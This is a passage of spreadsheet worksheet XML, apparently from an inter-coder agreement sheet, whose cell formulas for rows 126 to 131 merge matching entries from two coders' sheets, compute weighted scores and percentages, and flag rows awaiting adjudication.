        <f>IF(AND(Coder1!AN126=1,Coder2!AN126=1),IF(COUNTBLANK(E126:AH126)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN126" s="11">
        <f>IF(AND(Coder1!AN126=1,Coder2!AN126=1),IF(SUMPRODUCT(--(Coder1!E126:AH126&amp;""&lt;&gt;Coder2!E126:AH126&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO126" s="11" t="n"/>
    </row>
    <row r="127">
      <c r="A127" s="11">
        <f>Coder1!A127</f>
        <v/>
      </c>
      <c r="B127" s="11">
        <f>Coder1!B127</f>
        <v/>
      </c>
      <c r="C127" s="11">
        <f>Coder1!C127</f>
        <v/>
      </c>
      <c r="D127" s="11">
        <f>Coder1!D127</f>
        <v/>
      </c>
      <c r="E127" s="14">
        <f>IF(AND(Coder1!E127&amp;""&lt;&gt;"",Coder1!E127&amp;""=Coder2!E127&amp;""),Coder1!E127,"")</f>
        <v/>
      </c>
      <c r="F127" s="14">
        <f>IF(AND(Coder1!F127&amp;""&lt;&gt;"",Coder1!F127&amp;""=Coder2!F127&amp;""),Coder1!F127,"")</f>
        <v/>
      </c>
      <c r="G127" s="14">
        <f>IF(AND(Coder1!G127&amp;""&lt;&gt;"",Coder1!G127&amp;""=Coder2!G127&amp;""),Coder1!G127,"")</f>
        <v/>
      </c>
      <c r="H127" s="14">
        <f>IF(AND(Coder1!H127&amp;""&lt;&gt;"",Coder1!H127&amp;""=Coder2!H127&amp;""),Coder1!H127,"")</f>
        <v/>
      </c>
      <c r="I127" s="14">
        <f>IF(AND(Coder1!I127&amp;""&lt;&gt;"",Coder1!I127&amp;""=Coder2!I127&amp;""),Coder1!I127,"")</f>
        <v/>
      </c>
      <c r="J127" s="14">
        <f>IF(AND(Coder1!J127&amp;""&lt;&gt;"",Coder1!J127&amp;""=Coder2!J127&amp;""),Coder1!J127,"")</f>
        <v/>
      </c>
      <c r="K127" s="14">
        <f>IF(AND(Coder1!K127&amp;""&lt;&gt;"",Coder1!K127&amp;""=Coder2!K127&amp;""),Coder1!K127,"")</f>
        <v/>
      </c>
      <c r="L127" s="14">
        <f>IF(AND(Coder1!L127&amp;""&lt;&gt;"",Coder1!L127&amp;""=Coder2!L127&amp;""),Coder1!L127,"")</f>
        <v/>
      </c>
      <c r="M127" s="14">
        <f>IF(AND(Coder1!M127&amp;""&lt;&gt;"",Coder1!M127&amp;""=Coder2!M127&amp;""),Coder1!M127,"")</f>
        <v/>
      </c>
      <c r="N127" s="14">
        <f>IF(AND(Coder1!N127&amp;""&lt;&gt;"",Coder1!N127&amp;""=Coder2!N127&amp;""),Coder1!N127,"")</f>
        <v/>
      </c>
      <c r="O127" s="14">
        <f>IF(AND(Coder1!O127&amp;""&lt;&gt;"",Coder1!O127&amp;""=Coder2!O127&amp;""),Coder1!O127,"")</f>
        <v/>
      </c>
      <c r="P127" s="14">
        <f>IF(AND(Coder1!P127&amp;""&lt;&gt;"",Coder1!P127&amp;""=Coder2!P127&amp;""),Coder1!P127,"")</f>
        <v/>
      </c>
      <c r="Q127" s="14">
        <f>IF(AND(Coder1!Q127&amp;""&lt;&gt;"",Coder1!Q127&amp;""=Coder2!Q127&amp;""),Coder1!Q127,"")</f>
        <v/>
      </c>
      <c r="R127" s="14">
        <f>IF(AND(Coder1!R127&amp;""&lt;&gt;"",Coder1!R127&amp;""=Coder2!R127&amp;""),Coder1!R127,"")</f>
        <v/>
      </c>
      <c r="S127" s="14">
        <f>IF(AND(Coder1!S127&amp;""&lt;&gt;"",Coder1!S127&amp;""=Coder2!S127&amp;""),Coder1!S127,"")</f>
        <v/>
      </c>
      <c r="T127" s="14">
        <f>IF(AND(Coder1!T127&amp;""&lt;&gt;"",Coder1!T127&amp;""=Coder2!T127&amp;""),Coder1!T127,"")</f>
        <v/>
      </c>
      <c r="U127" s="14">
        <f>IF(AND(Coder1!U127&amp;""&lt;&gt;"",Coder1!U127&amp;""=Coder2!U127&amp;""),Coder1!U127,"")</f>
        <v/>
      </c>
      <c r="V127" s="14">
        <f>IF(AND(Coder1!V127&amp;""&lt;&gt;"",Coder1!V127&amp;""=Coder2!V127&amp;""),Coder1!V127,"")</f>
        <v/>
      </c>
      <c r="W127" s="14">
        <f>IF(AND(Coder1!W127&amp;""&lt;&gt;"",Coder1!W127&amp;""=Coder2!W127&amp;""),Coder1!W127,"")</f>
        <v/>
      </c>
      <c r="X127" s="14">
        <f>IF(AND(Coder1!X127&amp;""&lt;&gt;"",Coder1!X127&amp;""=Coder2!X127&amp;""),Coder1!X127,"")</f>
        <v/>
      </c>
      <c r="Y127" s="14">
        <f>IF(AND(Coder1!Y127&amp;""&lt;&gt;"",Coder1!Y127&amp;""=Coder2!Y127&amp;""),Coder1!Y127,"")</f>
        <v/>
      </c>
      <c r="Z127" s="14">
        <f>IF(AND(Coder1!Z127&amp;""&lt;&gt;"",Coder1!Z127&amp;""=Coder2!Z127&amp;""),Coder1!Z127,"")</f>
        <v/>
      </c>
      <c r="AA127" s="14">
        <f>IF(AND(Coder1!AA127&amp;""&lt;&gt;"",Coder1!AA127&amp;""=Coder2!AA127&amp;""),Coder1!AA127,"")</f>
        <v/>
      </c>
      <c r="AB127" s="14">
        <f>IF(AND(Coder1!AB127&amp;""&lt;&gt;"",Coder1!AB127&amp;""=Coder2!AB127&amp;""),Coder1!AB127,"")</f>
        <v/>
      </c>
      <c r="AC127" s="14">
        <f>IF(AND(Coder1!AC127&amp;""&lt;&gt;"",Coder1!AC127&amp;""=Coder2!AC127&amp;""),Coder1!AC127,"")</f>
        <v/>
      </c>
      <c r="AD127" s="14">
        <f>IF(AND(Coder1!AD127&amp;""&lt;&gt;"",Coder1!AD127&amp;""=Coder2!AD127&amp;""),Coder1!AD127,"")</f>
        <v/>
      </c>
      <c r="AE127" s="14">
        <f>IF(AND(Coder1!AE127&amp;""&lt;&gt;"",Coder1!AE127&amp;""=Coder2!AE127&amp;""),Coder1!AE127,"")</f>
        <v/>
      </c>
      <c r="AF127" s="14">
        <f>IF(AND(Coder1!AF127&amp;""&lt;&gt;"",Coder1!AF127&amp;""=Coder2!AF127&amp;""),Coder1!AF127,"")</f>
        <v/>
      </c>
      <c r="AG127" s="14">
        <f>IF(AND(Coder1!AG127&amp;""&lt;&gt;"",Coder1!AG127&amp;""=Coder2!AG127&amp;""),Coder1!AG127,"")</f>
        <v/>
      </c>
      <c r="AH127" s="14">
        <f>IF(AND(Coder1!AH127&amp;""&lt;&gt;"",Coder1!AH127&amp;""=Coder2!AH127&amp;""),Coder1!AH127,"")</f>
        <v/>
      </c>
      <c r="AI127" s="11">
        <f>IF(COUNT(E127:L127)=0,"",SUM(E127:L127))</f>
        <v/>
      </c>
      <c r="AJ127" s="11">
        <f>IF(AI127="","",N(E127)*3+N(F127)*2+N(G127)*2+N(H127)*2+N(I127)*2+N(J127)*3+N(K127)*3+N(L127)*3)</f>
        <v/>
      </c>
      <c r="AK127" s="11">
        <f>IF(AI127="","",COUNTIF(N127:AG127,1))</f>
        <v/>
      </c>
      <c r="AL127" s="11">
        <f>IF(OR(AJ127="",AJ127=0),"",ROUND(100*(AJ127-AK127)/AJ127,1))</f>
        <v/>
      </c>
      <c r="AM127" s="11">
        <f>IF(AND(Coder1!AN127=1,Coder2!AN127=1),IF(COUNTBLANK(E127:AH127)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN127" s="11">
        <f>IF(AND(Coder1!AN127=1,Coder2!AN127=1),IF(SUMPRODUCT(--(Coder1!E127:AH127&amp;""&lt;&gt;Coder2!E127:AH127&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO127" s="11" t="n"/>
    </row>
    <row r="128">
      <c r="A128" s="11">
        <f>Coder1!A128</f>
        <v/>
      </c>
      <c r="B128" s="11">
        <f>Coder1!B128</f>
        <v/>
      </c>
      <c r="C128" s="11">
        <f>Coder1!C128</f>
        <v/>
      </c>
      <c r="D128" s="11">
        <f>Coder1!D128</f>
        <v/>
      </c>
      <c r="E128" s="14">
        <f>IF(AND(Coder1!E128&amp;""&lt;&gt;"",Coder1!E128&amp;""=Coder2!E128&amp;""),Coder1!E128,"")</f>
        <v/>
      </c>
      <c r="F128" s="14">
        <f>IF(AND(Coder1!F128&amp;""&lt;&gt;"",Coder1!F128&amp;""=Coder2!F128&amp;""),Coder1!F128,"")</f>
        <v/>
      </c>
      <c r="G128" s="14">
        <f>IF(AND(Coder1!G128&amp;""&lt;&gt;"",Coder1!G128&amp;""=Coder2!G128&amp;""),Coder1!G128,"")</f>
        <v/>
      </c>
      <c r="H128" s="14">
        <f>IF(AND(Coder1!H128&amp;""&lt;&gt;"",Coder1!H128&amp;""=Coder2!H128&amp;""),Coder1!H128,"")</f>
        <v/>
      </c>
      <c r="I128" s="14">
        <f>IF(AND(Coder1!I128&amp;""&lt;&gt;"",Coder1!I128&amp;""=Coder2!I128&amp;""),Coder1!I128,"")</f>
        <v/>
      </c>
      <c r="J128" s="14">
        <f>IF(AND(Coder1!J128&amp;""&lt;&gt;"",Coder1!J128&amp;""=Coder2!J128&amp;""),Coder1!J128,"")</f>
        <v/>
      </c>
      <c r="K128" s="14">
        <f>IF(AND(Coder1!K128&amp;""&lt;&gt;"",Coder1!K128&amp;""=Coder2!K128&amp;""),Coder1!K128,"")</f>
        <v/>
      </c>
      <c r="L128" s="14">
        <f>IF(AND(Coder1!L128&amp;""&lt;&gt;"",Coder1!L128&amp;""=Coder2!L128&amp;""),Coder1!L128,"")</f>
        <v/>
      </c>
      <c r="M128" s="14">
        <f>IF(AND(Coder1!M128&amp;""&lt;&gt;"",Coder1!M128&amp;""=Coder2!M128&amp;""),Coder1!M128,"")</f>
        <v/>
      </c>
      <c r="N128" s="14">
        <f>IF(AND(Coder1!N128&amp;""&lt;&gt;"",Coder1!N128&amp;""=Coder2!N128&amp;""),Coder1!N128,"")</f>
        <v/>
      </c>
      <c r="O128" s="14">
        <f>IF(AND(Coder1!O128&amp;""&lt;&gt;"",Coder1!O128&amp;""=Coder2!O128&amp;""),Coder1!O128,"")</f>
        <v/>
      </c>
      <c r="P128" s="14">
        <f>IF(AND(Coder1!P128&amp;""&lt;&gt;"",Coder1!P128&amp;""=Coder2!P128&amp;""),Coder1!P128,"")</f>
        <v/>
      </c>
      <c r="Q128" s="14">
        <f>IF(AND(Coder1!Q128&amp;""&lt;&gt;"",Coder1!Q128&amp;""=Coder2!Q128&amp;""),Coder1!Q128,"")</f>
        <v/>
      </c>
      <c r="R128" s="14">
        <f>IF(AND(Coder1!R128&amp;""&lt;&gt;"",Coder1!R128&amp;""=Coder2!R128&amp;""),Coder1!R128,"")</f>
        <v/>
      </c>
      <c r="S128" s="14">
        <f>IF(AND(Coder1!S128&amp;""&lt;&gt;"",Coder1!S128&amp;""=Coder2!S128&amp;""),Coder1!S128,"")</f>
        <v/>
      </c>
      <c r="T128" s="14">
        <f>IF(AND(Coder1!T128&amp;""&lt;&gt;"",Coder1!T128&amp;""=Coder2!T128&amp;""),Coder1!T128,"")</f>
        <v/>
      </c>
      <c r="U128" s="14">
        <f>IF(AND(Coder1!U128&amp;""&lt;&gt;"",Coder1!U128&amp;""=Coder2!U128&amp;""),Coder1!U128,"")</f>
        <v/>
      </c>
      <c r="V128" s="14">
        <f>IF(AND(Coder1!V128&amp;""&lt;&gt;"",Coder1!V128&amp;""=Coder2!V128&amp;""),Coder1!V128,"")</f>
        <v/>
      </c>
      <c r="W128" s="14">
        <f>IF(AND(Coder1!W128&amp;""&lt;&gt;"",Coder1!W128&amp;""=Coder2!W128&amp;""),Coder1!W128,"")</f>
        <v/>
      </c>
      <c r="X128" s="14">
        <f>IF(AND(Coder1!X128&amp;""&lt;&gt;"",Coder1!X128&amp;""=Coder2!X128&amp;""),Coder1!X128,"")</f>
        <v/>
      </c>
      <c r="Y128" s="14">
        <f>IF(AND(Coder1!Y128&amp;""&lt;&gt;"",Coder1!Y128&amp;""=Coder2!Y128&amp;""),Coder1!Y128,"")</f>
        <v/>
      </c>
      <c r="Z128" s="14">
        <f>IF(AND(Coder1!Z128&amp;""&lt;&gt;"",Coder1!Z128&amp;""=Coder2!Z128&amp;""),Coder1!Z128,"")</f>
        <v/>
      </c>
      <c r="AA128" s="14">
        <f>IF(AND(Coder1!AA128&amp;""&lt;&gt;"",Coder1!AA128&amp;""=Coder2!AA128&amp;""),Coder1!AA128,"")</f>
        <v/>
      </c>
      <c r="AB128" s="14">
        <f>IF(AND(Coder1!AB128&amp;""&lt;&gt;"",Coder1!AB128&amp;""=Coder2!AB128&amp;""),Coder1!AB128,"")</f>
        <v/>
      </c>
      <c r="AC128" s="14">
        <f>IF(AND(Coder1!AC128&amp;""&lt;&gt;"",Coder1!AC128&amp;""=Coder2!AC128&amp;""),Coder1!AC128,"")</f>
        <v/>
      </c>
      <c r="AD128" s="14">
        <f>IF(AND(Coder1!AD128&amp;""&lt;&gt;"",Coder1!AD128&amp;""=Coder2!AD128&amp;""),Coder1!AD128,"")</f>
        <v/>
      </c>
      <c r="AE128" s="14">
        <f>IF(AND(Coder1!AE128&amp;""&lt;&gt;"",Coder1!AE128&amp;""=Coder2!AE128&amp;""),Coder1!AE128,"")</f>
        <v/>
      </c>
      <c r="AF128" s="14">
        <f>IF(AND(Coder1!AF128&amp;""&lt;&gt;"",Coder1!AF128&amp;""=Coder2!AF128&amp;""),Coder1!AF128,"")</f>
        <v/>
      </c>
      <c r="AG128" s="14">
        <f>IF(AND(Coder1!AG128&amp;""&lt;&gt;"",Coder1!AG128&amp;""=Coder2!AG128&amp;""),Coder1!AG128,"")</f>
        <v/>
      </c>
      <c r="AH128" s="14">
        <f>IF(AND(Coder1!AH128&amp;""&lt;&gt;"",Coder1!AH128&amp;""=Coder2!AH128&amp;""),Coder1!AH128,"")</f>
        <v/>
      </c>
      <c r="AI128" s="11">
        <f>IF(COUNT(E128:L128)=0,"",SUM(E128:L128))</f>
        <v/>
      </c>
      <c r="AJ128" s="11">
        <f>IF(AI128="","",N(E128)*3+N(F128)*2+N(G128)*2+N(H128)*2+N(I128)*2+N(J128)*3+N(K128)*3+N(L128)*3)</f>
        <v/>
      </c>
      <c r="AK128" s="11">
        <f>IF(AI128="","",COUNTIF(N128:AG128,1))</f>
        <v/>
      </c>
      <c r="AL128" s="11">
        <f>IF(OR(AJ128="",AJ128=0),"",ROUND(100*(AJ128-AK128)/AJ128,1))</f>
        <v/>
      </c>
      <c r="AM128" s="11">
        <f>IF(AND(Coder1!AN128=1,Coder2!AN128=1),IF(COUNTBLANK(E128:AH128)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN128" s="11">
        <f>IF(AND(Coder1!AN128=1,Coder2!AN128=1),IF(SUMPRODUCT(--(Coder1!E128:AH128&amp;""&lt;&gt;Coder2!E128:AH128&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO128" s="11" t="n"/>
    </row>
    <row r="129">
      <c r="A129" s="11">
        <f>Coder1!A129</f>
        <v/>
      </c>
      <c r="B129" s="11">
        <f>Coder1!B129</f>
        <v/>
      </c>
      <c r="C129" s="11">
        <f>Coder1!C129</f>
        <v/>
      </c>
      <c r="D129" s="11">
        <f>Coder1!D129</f>
        <v/>
      </c>
      <c r="E129" s="14">
        <f>IF(AND(Coder1!E129&amp;""&lt;&gt;"",Coder1!E129&amp;""=Coder2!E129&amp;""),Coder1!E129,"")</f>
        <v/>
      </c>
      <c r="F129" s="14">
        <f>IF(AND(Coder1!F129&amp;""&lt;&gt;"",Coder1!F129&amp;""=Coder2!F129&amp;""),Coder1!F129,"")</f>
        <v/>
      </c>
      <c r="G129" s="14">
        <f>IF(AND(Coder1!G129&amp;""&lt;&gt;"",Coder1!G129&amp;""=Coder2!G129&amp;""),Coder1!G129,"")</f>
        <v/>
      </c>
      <c r="H129" s="14">
        <f>IF(AND(Coder1!H129&amp;""&lt;&gt;"",Coder1!H129&amp;""=Coder2!H129&amp;""),Coder1!H129,"")</f>
        <v/>
      </c>
      <c r="I129" s="14">
        <f>IF(AND(Coder1!I129&amp;""&lt;&gt;"",Coder1!I129&amp;""=Coder2!I129&amp;""),Coder1!I129,"")</f>
        <v/>
      </c>
      <c r="J129" s="14">
        <f>IF(AND(Coder1!J129&amp;""&lt;&gt;"",Coder1!J129&amp;""=Coder2!J129&amp;""),Coder1!J129,"")</f>
        <v/>
      </c>
      <c r="K129" s="14">
        <f>IF(AND(Coder1!K129&amp;""&lt;&gt;"",Coder1!K129&amp;""=Coder2!K129&amp;""),Coder1!K129,"")</f>
        <v/>
      </c>
      <c r="L129" s="14">
        <f>IF(AND(Coder1!L129&amp;""&lt;&gt;"",Coder1!L129&amp;""=Coder2!L129&amp;""),Coder1!L129,"")</f>
        <v/>
      </c>
      <c r="M129" s="14">
        <f>IF(AND(Coder1!M129&amp;""&lt;&gt;"",Coder1!M129&amp;""=Coder2!M129&amp;""),Coder1!M129,"")</f>
        <v/>
      </c>
      <c r="N129" s="14">
        <f>IF(AND(Coder1!N129&amp;""&lt;&gt;"",Coder1!N129&amp;""=Coder2!N129&amp;""),Coder1!N129,"")</f>
        <v/>
      </c>
      <c r="O129" s="14">
        <f>IF(AND(Coder1!O129&amp;""&lt;&gt;"",Coder1!O129&amp;""=Coder2!O129&amp;""),Coder1!O129,"")</f>
        <v/>
      </c>
      <c r="P129" s="14">
        <f>IF(AND(Coder1!P129&amp;""&lt;&gt;"",Coder1!P129&amp;""=Coder2!P129&amp;""),Coder1!P129,"")</f>
        <v/>
      </c>
      <c r="Q129" s="14">
        <f>IF(AND(Coder1!Q129&amp;""&lt;&gt;"",Coder1!Q129&amp;""=Coder2!Q129&amp;""),Coder1!Q129,"")</f>
        <v/>
      </c>
      <c r="R129" s="14">
        <f>IF(AND(Coder1!R129&amp;""&lt;&gt;"",Coder1!R129&amp;""=Coder2!R129&amp;""),Coder1!R129,"")</f>
        <v/>
      </c>
      <c r="S129" s="14">
        <f>IF(AND(Coder1!S129&amp;""&lt;&gt;"",Coder1!S129&amp;""=Coder2!S129&amp;""),Coder1!S129,"")</f>
        <v/>
      </c>
      <c r="T129" s="14">
        <f>IF(AND(Coder1!T129&amp;""&lt;&gt;"",Coder1!T129&amp;""=Coder2!T129&amp;""),Coder1!T129,"")</f>
        <v/>
      </c>
      <c r="U129" s="14">
        <f>IF(AND(Coder1!U129&amp;""&lt;&gt;"",Coder1!U129&amp;""=Coder2!U129&amp;""),Coder1!U129,"")</f>
        <v/>
      </c>
      <c r="V129" s="14">
        <f>IF(AND(Coder1!V129&amp;""&lt;&gt;"",Coder1!V129&amp;""=Coder2!V129&amp;""),Coder1!V129,"")</f>
        <v/>
      </c>
      <c r="W129" s="14">
        <f>IF(AND(Coder1!W129&amp;""&lt;&gt;"",Coder1!W129&amp;""=Coder2!W129&amp;""),Coder1!W129,"")</f>
        <v/>
      </c>
      <c r="X129" s="14">
        <f>IF(AND(Coder1!X129&amp;""&lt;&gt;"",Coder1!X129&amp;""=Coder2!X129&amp;""),Coder1!X129,"")</f>
        <v/>
      </c>
      <c r="Y129" s="14">
        <f>IF(AND(Coder1!Y129&amp;""&lt;&gt;"",Coder1!Y129&amp;""=Coder2!Y129&amp;""),Coder1!Y129,"")</f>
        <v/>
      </c>
      <c r="Z129" s="14">
        <f>IF(AND(Coder1!Z129&amp;""&lt;&gt;"",Coder1!Z129&amp;""=Coder2!Z129&amp;""),Coder1!Z129,"")</f>
        <v/>
      </c>
      <c r="AA129" s="14">
        <f>IF(AND(Coder1!AA129&amp;""&lt;&gt;"",Coder1!AA129&amp;""=Coder2!AA129&amp;""),Coder1!AA129,"")</f>
        <v/>
      </c>
      <c r="AB129" s="14">
        <f>IF(AND(Coder1!AB129&amp;""&lt;&gt;"",Coder1!AB129&amp;""=Coder2!AB129&amp;""),Coder1!AB129,"")</f>
        <v/>
      </c>
      <c r="AC129" s="14">
        <f>IF(AND(Coder1!AC129&amp;""&lt;&gt;"",Coder1!AC129&amp;""=Coder2!AC129&amp;""),Coder1!AC129,"")</f>
        <v/>
      </c>
      <c r="AD129" s="14">
        <f>IF(AND(Coder1!AD129&amp;""&lt;&gt;"",Coder1!AD129&amp;""=Coder2!AD129&amp;""),Coder1!AD129,"")</f>
        <v/>
      </c>
      <c r="AE129" s="14">
        <f>IF(AND(Coder1!AE129&amp;""&lt;&gt;"",Coder1!AE129&amp;""=Coder2!AE129&amp;""),Coder1!AE129,"")</f>
        <v/>
      </c>
      <c r="AF129" s="14">
        <f>IF(AND(Coder1!AF129&amp;""&lt;&gt;"",Coder1!AF129&amp;""=Coder2!AF129&amp;""),Coder1!AF129,"")</f>
        <v/>
      </c>
      <c r="AG129" s="14">
        <f>IF(AND(Coder1!AG129&amp;""&lt;&gt;"",Coder1!AG129&amp;""=Coder2!AG129&amp;""),Coder1!AG129,"")</f>
        <v/>
      </c>
      <c r="AH129" s="14">
        <f>IF(AND(Coder1!AH129&amp;""&lt;&gt;"",Coder1!AH129&amp;""=Coder2!AH129&amp;""),Coder1!AH129,"")</f>
        <v/>
      </c>
      <c r="AI129" s="11">
        <f>IF(COUNT(E129:L129)=0,"",SUM(E129:L129))</f>
        <v/>
      </c>
      <c r="AJ129" s="11">
        <f>IF(AI129="","",N(E129)*3+N(F129)*2+N(G129)*2+N(H129)*2+N(I129)*2+N(J129)*3+N(K129)*3+N(L129)*3)</f>
        <v/>
      </c>
      <c r="AK129" s="11">
        <f>IF(AI129="","",COUNTIF(N129:AG129,1))</f>
        <v/>
      </c>
      <c r="AL129" s="11">
        <f>IF(OR(AJ129="",AJ129=0),"",ROUND(100*(AJ129-AK129)/AJ129,1))</f>
        <v/>
      </c>
      <c r="AM129" s="11">
        <f>IF(AND(Coder1!AN129=1,Coder2!AN129=1),IF(COUNTBLANK(E129:AH129)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN129" s="11">
        <f>IF(AND(Coder1!AN129=1,Coder2!AN129=1),IF(SUMPRODUCT(--(Coder1!E129:AH129&amp;""&lt;&gt;Coder2!E129:AH129&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO129" s="11" t="n"/>
    </row>
    <row r="130">
      <c r="A130" s="11">
        <f>Coder1!A130</f>
        <v/>
      </c>
      <c r="B130" s="11">
        <f>Coder1!B130</f>
        <v/>
      </c>
      <c r="C130" s="11">
        <f>Coder1!C130</f>
        <v/>
      </c>
      <c r="D130" s="11">
        <f>Coder1!D130</f>
        <v/>
      </c>
      <c r="E130" s="14">
        <f>IF(AND(Coder1!E130&amp;""&lt;&gt;"",Coder1!E130&amp;""=Coder2!E130&amp;""),Coder1!E130,"")</f>
        <v/>
      </c>
      <c r="F130" s="14">
        <f>IF(AND(Coder1!F130&amp;""&lt;&gt;"",Coder1!F130&amp;""=Coder2!F130&amp;""),Coder1!F130,"")</f>
        <v/>
      </c>
      <c r="G130" s="14">
        <f>IF(AND(Coder1!G130&amp;""&lt;&gt;"",Coder1!G130&amp;""=Coder2!G130&amp;""),Coder1!G130,"")</f>
        <v/>
      </c>
      <c r="H130" s="14">
        <f>IF(AND(Coder1!H130&amp;""&lt;&gt;"",Coder1!H130&amp;""=Coder2!H130&amp;""),Coder1!H130,"")</f>
        <v/>
      </c>
      <c r="I130" s="14">
        <f>IF(AND(Coder1!I130&amp;""&lt;&gt;"",Coder1!I130&amp;""=Coder2!I130&amp;""),Coder1!I130,"")</f>
        <v/>
      </c>
      <c r="J130" s="14">
        <f>IF(AND(Coder1!J130&amp;""&lt;&gt;"",Coder1!J130&amp;""=Coder2!J130&amp;""),Coder1!J130,"")</f>
        <v/>
      </c>
      <c r="K130" s="14">
        <f>IF(AND(Coder1!K130&amp;""&lt;&gt;"",Coder1!K130&amp;""=Coder2!K130&amp;""),Coder1!K130,"")</f>
        <v/>
      </c>
      <c r="L130" s="14">
        <f>IF(AND(Coder1!L130&amp;""&lt;&gt;"",Coder1!L130&amp;""=Coder2!L130&amp;""),Coder1!L130,"")</f>
        <v/>
      </c>
      <c r="M130" s="14">
        <f>IF(AND(Coder1!M130&amp;""&lt;&gt;"",Coder1!M130&amp;""=Coder2!M130&amp;""),Coder1!M130,"")</f>
        <v/>
      </c>
      <c r="N130" s="14">
        <f>IF(AND(Coder1!N130&amp;""&lt;&gt;"",Coder1!N130&amp;""=Coder2!N130&amp;""),Coder1!N130,"")</f>
        <v/>
      </c>
      <c r="O130" s="14">
        <f>IF(AND(Coder1!O130&amp;""&lt;&gt;"",Coder1!O130&amp;""=Coder2!O130&amp;""),Coder1!O130,"")</f>
        <v/>
      </c>
      <c r="P130" s="14">
        <f>IF(AND(Coder1!P130&amp;""&lt;&gt;"",Coder1!P130&amp;""=Coder2!P130&amp;""),Coder1!P130,"")</f>
        <v/>
      </c>
      <c r="Q130" s="14">
        <f>IF(AND(Coder1!Q130&amp;""&lt;&gt;"",Coder1!Q130&amp;""=Coder2!Q130&amp;""),Coder1!Q130,"")</f>
        <v/>
      </c>
      <c r="R130" s="14">
        <f>IF(AND(Coder1!R130&amp;""&lt;&gt;"",Coder1!R130&amp;""=Coder2!R130&amp;""),Coder1!R130,"")</f>
        <v/>
      </c>
      <c r="S130" s="14">
        <f>IF(AND(Coder1!S130&amp;""&lt;&gt;"",Coder1!S130&amp;""=Coder2!S130&amp;""),Coder1!S130,"")</f>
        <v/>
      </c>
      <c r="T130" s="14">
        <f>IF(AND(Coder1!T130&amp;""&lt;&gt;"",Coder1!T130&amp;""=Coder2!T130&amp;""),Coder1!T130,"")</f>
        <v/>
      </c>
      <c r="U130" s="14">
        <f>IF(AND(Coder1!U130&amp;""&lt;&gt;"",Coder1!U130&amp;""=Coder2!U130&amp;""),Coder1!U130,"")</f>
        <v/>
      </c>
      <c r="V130" s="14">
        <f>IF(AND(Coder1!V130&amp;""&lt;&gt;"",Coder1!V130&amp;""=Coder2!V130&amp;""),Coder1!V130,"")</f>
        <v/>
      </c>
      <c r="W130" s="14">
        <f>IF(AND(Coder1!W130&amp;""&lt;&gt;"",Coder1!W130&amp;""=Coder2!W130&amp;""),Coder1!W130,"")</f>
        <v/>
      </c>
      <c r="X130" s="14">
        <f>IF(AND(Coder1!X130&amp;""&lt;&gt;"",Coder1!X130&amp;""=Coder2!X130&amp;""),Coder1!X130,"")</f>
        <v/>
      </c>
      <c r="Y130" s="14">
        <f>IF(AND(Coder1!Y130&amp;""&lt;&gt;"",Coder1!Y130&amp;""=Coder2!Y130&amp;""),Coder1!Y130,"")</f>
        <v/>
      </c>
      <c r="Z130" s="14">
        <f>IF(AND(Coder1!Z130&amp;""&lt;&gt;"",Coder1!Z130&amp;""=Coder2!Z130&amp;""),Coder1!Z130,"")</f>
        <v/>
      </c>
      <c r="AA130" s="14">
        <f>IF(AND(Coder1!AA130&amp;""&lt;&gt;"",Coder1!AA130&amp;""=Coder2!AA130&amp;""),Coder1!AA130,"")</f>
        <v/>
      </c>
      <c r="AB130" s="14">
        <f>IF(AND(Coder1!AB130&amp;""&lt;&gt;"",Coder1!AB130&amp;""=Coder2!AB130&amp;""),Coder1!AB130,"")</f>
        <v/>
      </c>
      <c r="AC130" s="14">
        <f>IF(AND(Coder1!AC130&amp;""&lt;&gt;"",Coder1!AC130&amp;""=Coder2!AC130&amp;""),Coder1!AC130,"")</f>
        <v/>
      </c>
      <c r="AD130" s="14">
        <f>IF(AND(Coder1!AD130&amp;""&lt;&gt;"",Coder1!AD130&amp;""=Coder2!AD130&amp;""),Coder1!AD130,"")</f>
        <v/>
      </c>
      <c r="AE130" s="14">
        <f>IF(AND(Coder1!AE130&amp;""&lt;&gt;"",Coder1!AE130&amp;""=Coder2!AE130&amp;""),Coder1!AE130,"")</f>
        <v/>
      </c>
      <c r="AF130" s="14">
        <f>IF(AND(Coder1!AF130&amp;""&lt;&gt;"",Coder1!AF130&amp;""=Coder2!AF130&amp;""),Coder1!AF130,"")</f>
        <v/>
      </c>
      <c r="AG130" s="14">
        <f>IF(AND(Coder1!AG130&amp;""&lt;&gt;"",Coder1!AG130&amp;""=Coder2!AG130&amp;""),Coder1!AG130,"")</f>
        <v/>
      </c>
      <c r="AH130" s="14">
        <f>IF(AND(Coder1!AH130&amp;""&lt;&gt;"",Coder1!AH130&amp;""=Coder2!AH130&amp;""),Coder1!AH130,"")</f>
        <v/>
      </c>
      <c r="AI130" s="11">
        <f>IF(COUNT(E130:L130)=0,"",SUM(E130:L130))</f>
        <v/>
      </c>
      <c r="AJ130" s="11">
        <f>IF(AI130="","",N(E130)*3+N(F130)*2+N(G130)*2+N(H130)*2+N(I130)*2+N(J130)*3+N(K130)*3+N(L130)*3)</f>
        <v/>
      </c>
      <c r="AK130" s="11">
        <f>IF(AI130="","",COUNTIF(N130:AG130,1))</f>
        <v/>
      </c>
      <c r="AL130" s="11">
        <f>IF(OR(AJ130="",AJ130=0),"",ROUND(100*(AJ130-AK130)/AJ130,1))</f>
        <v/>
      </c>
      <c r="AM130" s="11">
        <f>IF(AND(Coder1!AN130=1,Coder2!AN130=1),IF(COUNTBLANK(E130:AH130)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN130" s="11">
        <f>IF(AND(Coder1!AN130=1,Coder2!AN130=1),IF(SUMPRODUCT(--(Coder1!E130:AH130&amp;""&lt;&gt;Coder2!E130:AH130&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO130" s="11" t="n"/>
    </row>
    <row r="131">
      <c r="A131" s="11">
        <f>Coder1!A131</f>
        <v/>
      </c>
      <c r="B131" s="11">
        <f>Coder1!B131</f>
        <v/>
      </c>
